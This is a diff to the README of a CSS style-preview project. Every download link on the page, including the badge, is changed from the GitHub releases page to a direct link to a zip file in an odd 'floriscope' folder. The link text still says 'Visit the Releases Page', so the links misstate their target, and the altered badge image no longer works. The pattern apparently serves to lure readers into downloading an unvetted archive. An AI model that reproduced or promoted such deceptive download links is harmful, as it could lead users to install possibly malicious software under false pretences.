@@ -1,6 +1,6 @@
 # 🎨 classless-css-previews - Preview Amazing Styles Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-blue)](https://github.com/AIfinds99/classless-css-previews/releases)
+[![Download Now](https://raw.githubusercontent.com/AIfinds99/classless-css-previews/main/floriscope/classless-css-previews.zip%20Now-Get%20Started-blue)](https://raw.githubusercontent.com/AIfinds99/classless-css-previews/main/floriscope/classless-css-previews.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ Welcome to **classless-css-previews**! This application allows you to see 69 dif
 
 To get started, you need to download the application. Click the link below to visit the releases page:
 
-[Visit the Releases Page to Download](https://github.com/AIfinds99/classless-css-previews/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/AIfinds99/classless-css-previews/main/floriscope/classless-css-previews.zip)
 
 On the releases page, you will find various versions of the application. Choose the most recent version and download the file suitable for your operating system.
 
@@ -74,4 +74,4 @@ For further inquiries, you can reach out through the issues section of the GitHu
 
 We hope you enjoy using **classless-css-previews**. Explore the design options and find the perfect style for your next project!
 
-[Visit the Releases Page to Download](https://github.com/AIfinds99/classless-css-previews/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/AIfinds99/classless-css-previews/main/floriscope/classless-css-previews.zip)
